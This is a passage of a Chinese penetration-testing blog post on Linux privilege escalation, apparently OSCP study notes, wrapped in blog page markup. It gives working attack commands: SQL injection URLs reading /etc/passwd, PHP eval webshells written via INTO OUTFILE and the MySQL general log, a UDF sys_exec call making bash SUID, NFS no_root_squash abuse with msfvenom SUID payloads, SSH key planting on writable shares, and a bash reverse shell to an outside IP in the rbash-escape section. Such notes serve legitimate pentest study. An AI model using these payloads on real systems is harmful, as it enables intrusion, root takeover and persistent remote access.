+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user%20UNION%20SELECT%201,load_file(0x2f6574632f706173737764),3,4,5,6,7,8,9</span><br><span class="line">http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user%20UNION%20SELECT%201,load_file(CHAR(47, 101, 116, 99, 47, 112, 97, 115, 115, 119, 100)),3,4,5,6,7,8,9</span><br></pre></td></tr></table></figure>
+
+<p>读取的文件名要进行转码,转码要求不能带引号</p>
+<h4 id="写一句话获得webshell"><a href="#写一句话获得webshell" class="headerlink" title="写一句话获得webshell"></a>写一句话获得webshell</h4><h5 id="secure-file-priv写一句话"><a href="#secure-file-priv写一句话" class="headerlink" title="secure-file-priv写一句话"></a>secure-file-priv写一句话</h5><p>获取webshell的条件也是苛刻，首先</p>
+<ul>
+<li>GPC关闭</li>
+<li>对web目录有写的权限</li>
+<li>知道web目录的绝对路径</li>
+<li>没有配置secure-file-priv</li>
+</ul>
+<p>首先查看数据库配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">| Variable_name            | Value |</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">| require_secure_transport | OFF   |</span><br><span class="line">| secure_auth              | ON    |</span><br><span class="line">| secure_file_priv         |       |</span><br><span class="line">+--------------------------+-------+</span><br><span class="line">select &#39;&lt;?php eval($_POST[admin])?&gt;&#39; into outfile &#39;&#x2F;home&#x2F;wwwroot&#x2F;https&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure>
+
+<p>如果<code>outfile</code>函数不能用则可以使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[admin])?&gt;&#39; into dumpfile &#39;&#x2F;home&#x2F;wwwroot&#x2F;https&#x2F;shell.php&#39;</span><br></pre></td></tr></table></figure>
+
+<h5 id="日志写入一句话"><a href="#日志写入一句话" class="headerlink" title="日志写入一句话"></a>日志写入一句话</h5><p>利用要求：</p>
+<ul>
+<li>管理员权限</li>
+<li>知道网站的绝对路径</li>
+</ul>
+<p>必要选项：</p>
+<ul>
+<li>general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。</li>
+<li>general log file 指的是日志的保存路径。</li>
+</ul>
+<p>这两个选项能通过在mysql或者是在phpmyadmin中打开。执行一条sql语句便会被记录到日志文件中。所以只要把日志保存的路径和日志文件名设置成网站路径下的php，就可以生成一个文件，并把一句话代入到其中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;;</span><br><span class="line">set global general_log_file&#x3D;&#39;D:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;xxx.php&#39;</span><br><span class="line">select &#39;&lt;?php eval($_POST[a]);?&gt;&#39;;</span><br></pre></td></tr></table></figure>
+<h4 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_exec returns integer soname &#39;lib_mysqludf_sys.so&#39;;</span><br></pre></td></tr></table></figure>
+<p>如果成功的话,就可以直接利用sys_exec去执行系统的命令.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_exec(&#39;chmod u+s &#x2F;bin&#x2F;bash&#39;); # 如果执行成功,&#x2F;bin&#x2F;bash将会成为suid位文件,普通用户直接bash -p就能获得root权限.</span><br></pre></td></tr></table></figure>
+
+<h3 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h3><a href="https://whale3070.github.io/oscp/2019/12/06/02-x/" title="" target="">oscp真题解析-NFS</a>
+
+<h4 id="NFS版本漏洞"><a href="#NFS版本漏洞" class="headerlink" title="NFS版本漏洞"></a>NFS版本漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit nfs | grep -v &#39;dos&#39; | grep -v &#39;windows&#39;</span><br></pre></td></tr></table></figure>
+<h4 id="权限配置不当"><a href="#权限配置不当" class="headerlink" title="权限配置不当"></a>权限配置不当</h4><p>检查机器上的NFS配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;exports</span><br></pre></td></tr></table></figure>
+
+<p>如果有<code>no_root_squash</code>这个选项，root用户就会对共享目录拥有至高的权限控制，就像是对本机的目录操作一样。</p>
+<p>假设我们的目标机器上面存在这个配置要怎么利用呢？先用其他机器的root用户挂载目标机器上的NFS共享目录，然后用<code>msfvenom</code>生成一个<code>shell</code>在NFS的共享目录上。然后给予suid位权限，完成之后返回到目标机器上面的低权限用户上执行这个程序，就可以获得一个<code>root_shell</code>了。</p>
+<p>在攻击机上以root用户操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;tmp&#x2F;nfs</span><br><span class="line">mount -o rw,vers&#x3D;3 10.10.10.10:&#x2F;tmp &#x2F;tmp&#x2F;nfs</span><br><span class="line">msfvenom -p linux&#x2F;x86&#x2F;exec CMD&#x3D;&quot;&#x2F;bin&#x2F;bash -p&quot; -f elf -o &#x2F;tmp&#x2F;nfs&#x2F;shell.elf</span><br><span class="line">chmod +xs &#x2F;tmp&#x2F;nfs&#x2F;shell.elf</span><br></pre></td></tr></table></figure>
+<p>现在返回目标机上的低权限用户执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmp&#x2F;shell.elf</span><br></pre></td></tr></table></figure>
+
+<a href="https://www.cesafe.com/html/6866.html" title="" target="">Linux NFS提权 Linux N​​FS共享权限提升</a>
+
+<p>所以，也可以不需要生成一个木马的操作。我们可以直接以root用户身份复制攻击机上面的shell到共享目录中，给予suid权限，然后切换到目标机，执行该程序即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp &#96;which sh&#96; &#x2F;tmp&#x2F;nfs</span><br><span class="line">chmod +s &#x2F;tmp&#x2F;nfs&#x2F;sh</span><br><span class="line"></span><br><span class="line">-------目标机执行</span><br><span class="line">.&#x2F;sh -p</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h4 id="共享目录可写"><a href="#共享目录可写" class="headerlink" title="共享目录可写"></a>共享目录可写</h4><p>探测可挂载的目录。 可以看到/home/peter允许挂载，那么我们就可以挂载之后在自己的机器上添加一个用户，去操作这个用户的文件之类的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 111 --script&#x3D;nfs* 192.168.56.7</span><br><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-07-12 07:40 EDT</span><br><span class="line">Nmap scan report for 192.168.56.7</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">111&#x2F;tcp open  rpcbind</span><br><span class="line">| nfs-showmount: </span><br><span class="line">|_  &#x2F;home&#x2F;peter *</span><br></pre></td></tr></table></figure>
+
+<p>写入操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~&#x2F;home</span><br><span class="line">sudo mount -o nolock 192.168.56.7:&#x2F;home&#x2F; &#x2F;home&#x2F;kali&#x2F;home&#x2F;</span><br><span class="line">sudo grounpadd -g 1005 peter</span><br><span class="line">sudo adduser peter -uid 1001 -gid 1005</span><br><span class="line"></span><br><span class="line">su peter</span><br><span class="line">ssh-keygen</span><br><span class="line">cat ~&#x2F;home&#x2F;.ssh&#x2F;id_rsa.pub &gt;&#x2F;home&#x2F;kali&#x2F;home&#x2F;peter&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">ssh peter@192.168.56.7</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用以下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o nolock 192.168.56.7:&#x2F;home&#x2F; &#x2F;home&#x2F;kali&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>挂在成功后权限位有问题(好像就只有nfs4会有问题。。)</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201130100953041.png" alt="image-20201130100953041"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -o nolock,vers&#x3D;3  192.168.56.7:&#x2F;home&#x2F; &#x2F;tmp&#x2F;home&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201130101625001.png" alt="image-20201130101625001"></p>
+<p>共享目录可写的配置文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">peter@linsecurity:~$ cat &#x2F;etc&#x2F;exports</span><br><span class="line"># &#x2F;etc&#x2F;exports: the access control list for filesystems which may be exported</span><br><span class="line">#               to NFS clients.  See exports(5).</span><br><span class="line">#</span><br><span class="line"># Example for NFSv2 and NFSv3:</span><br><span class="line"># &#x2F;srv&#x2F;homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span><br><span class="line">#</span><br><span class="line"># Example for NFSv4:</span><br><span class="line"># &#x2F;srv&#x2F;nfs4        gss&#x2F;krb5i(rw,sync,fsid&#x3D;0,crossmnt,no_subtree_check)</span><br><span class="line"># &#x2F;srv&#x2F;nfs4&#x2F;homes  gss&#x2F;krb5i(rw,sync,no_subtree_check)</span><br><span class="line">#</span><br><span class="line">&#x2F;home&#x2F;peter *(rw)</span><br></pre></td></tr></table></figure>
+
+<h4 id="敏感信息泄露-1"><a href="#敏感信息泄露-1" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><p>挂载NFS磁盘之后找到一些密码或者是私钥等。</p>
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><h4 id="SMB-Cry"><a href="#SMB-Cry" class="headerlink" title="SMB_Cry"></a>SMB_Cry</h4><h4 id="CVE-2010-0926-Samba-smbd默认配置目录遍历漏洞"><a href="#CVE-2010-0926-Samba-smbd默认配置目录遍历漏洞" class="headerlink" title="CVE-2010-0926 Samba smbd默认配置目录遍历漏洞 "></a><a href="https://www.cvedetails.com/cve/CVE-2010-0926/" target="_blank" rel="noopener">CVE-2010-0926 Samba smbd默认配置目录遍历漏洞 </a></h4><ul>
+<li><a href="https://www.exploit-db.com/exploits/33599" target="_blank" rel="noopener">Samba 3.4.5 - Symlink Directory Traversal </a></li>
+<li><a href="https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal/" target="_blank" rel="noopener">Samba 3.4.5 - Symlink Directory Traversal-Metasploit</a></li>
+<li><a href="https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually" target="_blank" rel="noopener">Symlink-Directory-Traversal-smb-manually</a></li>
+<li><a href="https://packetstormsecurity.com/files/85957/Samba-Remote-Directory-Traversal.html" target="_blank" rel="noopener">Samba-Remote-Directory-Traversal-packetstormsecurity</a></li>
+</ul>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="rbash逃逸"><a href="#rbash逃逸" class="headerlink" title="rbash逃逸"></a>rbash逃逸</h3><ul>
+<li><a href="https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/" target="_blank" rel="noopener">rbash逃逸</a></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh user@ip -t <span class="string">'bash --noprofile'</span></span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh user@ip -t <span class="string">"export TERM=xterm;python -c  'import pty;pty.spawn(\"/bin/bash\")'"</span></span><br><span class="line">ssh user@ip -t <span class="string">"export TERM=xterm;bash -c 'bash -i &gt;&amp;/dev/tcp/192.168.119.163/80 0&gt;&amp;1'"</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Bash-dropping-privileges"><a href="#Bash-dropping-privileges" class="headerlink" title="Bash dropping privileges"></a>Bash dropping privileges</h3><p>当bash运行时，它会检查$UID是否与$EUID匹配。如果没有(通常是通过suid方式提权的，就会出现这种情况)，那么bash将删除特权。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /bin/bash /tmp/b &amp;&amp; chmod +s /tmp/b</span><br><span class="line">/bin/b -p <span class="comment">### 维持特权</span></span><br></pre></td></tr></table></figure>
+
+<p>用msf生成linux的二进制payload时可以添加<code>PrependSetuid=true</code>这个参数</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;netbiosX&#x2F;Checklists&#x2F;blob&#x2F;master&#x2F;Linux-Privilege-Escalation.md</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;blob&#x2F;master&#x2F;Methodology%20and%20Resources&#x2F;Linux%20-%20Privilege%20Escalation.md</span><br><span class="line">https:&#x2F;&#x2F;sushant747.gitbooks.io&#x2F;total-oscp-guide&#x2F;privilege_escalation_-_linux.html</span><br><span class="line">https:&#x2F;&#x2F;payatu.com&#x2F;guide-linux-privilege-escalation</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><a href="https://tryhackme.com/room/privescplayground" target="_blank" rel="noopener">privescplayground</a></li>
+<li><a href="https://tryhackme.com/room/commonlinuxprivesc" target="_blank" rel="noopener">Common Linux Privesc</a></li>
+<li><a href="https://segmentfault.com/a/1190000019948872" target="_blank" rel="noopener">NFS利用</a></li>
+<li><a href="https://www.cesafe.com/html/6866.html" title="" target="">Linux NFS提权 Linux N​​FS共享权限提升</a></li>
+<li><a href="https://docs.docker.com/engine/security/" target="_blank" rel="noopener">docker-security</a></li>
+<li><a href="https://www.exploit-db.com/exploits/40394" target="_blank" rel="noopener">msf-docker</a></li>
+<li><a href="https://www.anquanke.com/post/id/146799#h3-9" target="_blank" rel="noopener">利用PATH环境变量进行Linux提权</a></li>
+<li><a href="https://www.cnblogs.com/sparkdev/p/9651622.html" target="_blank" rel="noopener">SUID</a></li>
+<li><a href="https://blog.csdn.net/a1154490629/article/details/52190801" target="_blank" rel="noopener">/etc/passwd</a></li>
+<li><a href="https://cloud.tencent.com/developer/article/1038337" title="" target="">动态链接共享对象库提权</a></li>
+<li><a href="https://www.secpulse.com/archives/72965.html" target="_blank" rel="noopener">利用通配符实现Linux本地提权-安全脉搏</a></li>
+<li><a href="https://www.freebuf.com/articles/system/175453.html" target="_blank" rel="noopener">如何使用Cron Jobs实现Linux提权</a></li>
+<li><a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/" target="_blank" rel="noopener">Exploiting wildcards on Linux</a></li>
+<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">basic-linux-privilege-escalation</a></li>
+<li><a href="https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099" target="_blank" rel="noopener">Day 44: Linux Capabilities Privilege Escalation via OpenSSL with SELinux Enabled and Enforced</a></li>
+<li><a href="https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099" target="_blank" rel="noopener">Linux系统利用可执行文件的Capabilities实现权限提升 </a></li>
+<li><a href="https://hack-tips.com/2020/02/21/how-to-find-nfs-mounted-drives-penetration-testing/" target="_blank" rel="noopener">how-to-find-nfs-mounted-drives-penetration-testing/</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/04/14/Linux%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F/" title="Linux提权方式">http://atsud0.me/2020/04/14/Linux提权方式/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
+              <a href="/tags/sudo/" rel="tag"><i class="fa fa-tag"></i> sudo</a>
+              <a href="/tags/crontab/" rel="tag"><i class="fa fa-tag"></i> crontab</a>
+              <a href="/tags/path/" rel="tag"><i class="fa fa-tag"></i> path</a>
+              <a href="/tags/suid/" rel="tag"><i class="fa fa-tag"></i> suid</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/20/sqli-labs-less-1-7/" rel="prev" title="sqli-labs_less_1-7">
+      <i class="fa fa-chevron-left"></i> sqli-labs_less_1-7
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/04/14/Tmux%E5%BF%AB%E9%80%9F%E6%8C%87%E5%8C%97/" rel="next" title="Tmux快速指北">
+      Tmux快速指北 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础信息收集"><span class="nav-number">1.</span> <span class="nav-text">基础信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#判断发行版"><span class="nav-number">1.1.</span> <span class="nav-text">判断发行版</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断内核和系统位数"><span class="nav-number">1.2.</span> <span class="nav-text">判断内核和系统位数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网络信息"><span class="nav-number">1.3.</span> <span class="nav-text">网络信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#当前进程（最好看看root用户运行的进程"><span class="nav-number">1.4.</span> <span class="nav-text">当前进程（最好看看root用户运行的进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#软件版本"><span class="nav-number">1.5.</span> <span class="nav-text">软件版本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息收集脚本"><span class="nav-number">2.</span> <span class="nav-text">信息收集脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LinEnum"><span class="nav-number">2.1.</span> <span class="nav-text">LinEnum</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LinPEAS"><span class="nav-number">2.2.</span> <span class="nav-text">LinPEAS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-Exploit-Suggester"><span class="nav-number">2.3.</span> <span class="nav-text">Linux_Exploit_Suggester</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linuxprivchecker"><span class="nav-number">2.4.</span> <span class="nav-text">linuxprivchecker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lse"><span class="nav-number">2.5.</span> <span class="nav-text">lse</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#敏感信息泄露"><span class="nav-number">3.</span> <span class="nav-text">敏感信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#配置文件信息泄露"><span class="nav-number">3.1.</span> <span class="nav-text">配置文件信息泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH-Key私钥泄露"><span class="nav-number">3.2.</span> <span class="nav-text">SSH-Key私钥泄露</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#openvpn"><span class="nav-number">3.3.</span> <span class="nav-text">openvpn</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#history"><span class="nav-number">3.4.</span> <span class="nav-text">history</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vi-vim-swp"><span class="nav-number">3.5.</span> <span class="nav-text">vi&#x2F;vim .swp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网站CMS的config-php"><span class="nav-number">3.6.</span> <span class="nav-text">网站CMS的config.php</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#wordpress"><span class="nav-number">3.6.1.</span> <span class="nav-text">wordpress</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#错误配置提权"><span class="nav-number">4.</span> <span class="nav-text">错误配置提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#错误配置-etc-passwd"><span class="nav-number">4.1.</span> <span class="nav-text">错误配置 &#x2F;etc&#x2F;passwd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#错误配置-etc-shadow"><span class="nav-number">4.2.</span> <span class="nav-text">错误配置 &#x2F;etc&#x2F;shadow</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUID位二进制文件提权"><span class="nav-number">5.</span> <span class="nav-text">SUID位二进制文件提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SUID-exim-CVE-2016-1531-提权"><span class="nav-number">5.1.</span> <span class="nav-text">SUID-exim-CVE-2016-1531 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUID-nginx-CVE-2016-1247-提权"><span class="nav-number">5.2.</span> <span class="nav-text">SUID nginx CVE-2016-1247 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUID-suid-so-共享对象库注入"><span class="nav-number">5.3.</span> <span class="nav-text">SUID suid-so 共享对象库注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SUID-env提权"><span class="nav-number">5.4.</span> <span class="nav-text">SUID env提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一种没有绝对路径的service"><span class="nav-number">5.4.1.</span> <span class="nav-text">第一种没有绝对路径的service</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二种有绝对路径的service"><span class="nav-number">5.4.2.</span> <span class="nav-text">第二种有绝对路径的service</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#suid-taskset"><span class="nav-number">5.5.</span> <span class="nav-text">suid taskset</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#suid-cp"><span class="nav-number">5.6.</span> <span class="nav-text">suid cp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo-提权"><span class="nav-number">6.</span> <span class="nav-text">sudo 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-nmap"><span class="nav-number">6.1.</span> <span class="nav-text">sudo nmap</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap-2-02-5-21"><span class="nav-number">6.1.1.</span> <span class="nav-text">nmap 2.02 - 5.21</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nmap-脚本提权"><span class="nav-number">6.1.2.</span> <span class="nav-text">nmap 脚本提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-apache2"><span class="nav-number">6.2.</span> <span class="nav-text">sudo apache2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#动态连接共享库提权"><span class="nav-number">6.2.1.</span> <span class="nav-text">动态连接共享库提权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#滥用预期功能"><span class="nav-number">6.2.2.</span> <span class="nav-text">滥用预期功能</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-find"><span class="nav-number">6.3.</span> <span class="nav-text">sudo find</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-awk"><span class="nav-number">6.4.</span> <span class="nav-text">sudo awk</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-zip"><span class="nav-number">6.5.</span> <span class="nav-text">sudo zip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-tar"><span class="nav-number">6.6.</span> <span class="nav-text">sudo tar</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-vi-vim"><span class="nav-number">6.7.</span> <span class="nav-text">sudo vi&#x2F;vim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-java"><span class="nav-number">6.8.</span> <span class="nav-text">sudo java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-man"><span class="nav-number">6.9.</span> <span class="nav-text">sudo man</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-yum"><span class="nav-number">6.10.</span> <span class="nav-text">sudo yum</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-pkexec"><span class="nav-number">6.11.</span> <span class="nav-text">sudo pkexec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-systemctl"><span class="nav-number">6.12.</span> <span class="nav-text">sudo systemctl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-journalctl"><span class="nav-number">6.13.</span> <span class="nav-text">sudo journalctl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-strace"><span class="nav-number">6.14.</span> <span class="nav-text">sudo strace</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-taskset"><span class="nav-number">6.15.</span> <span class="nav-text">sudo taskset</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-pip-pip3"><span class="nav-number">6.16.</span> <span class="nav-text">sudo pip&#x2F;pip3</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#法一"><span class="nav-number">6.16.1.</span> <span class="nav-text">法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#法二"><span class="nav-number">6.16.2.</span> <span class="nav-text">法二</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-CVE-2019-14287-提权"><span class="nav-number">6.17.</span> <span class="nav-text">sudo CVE-2019-14287 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sudo-CVE-2019-18634-提权"><span class="nav-number">6.18.</span> <span class="nav-text">sudo CVE-2019-18634 提权</span></a></li><li 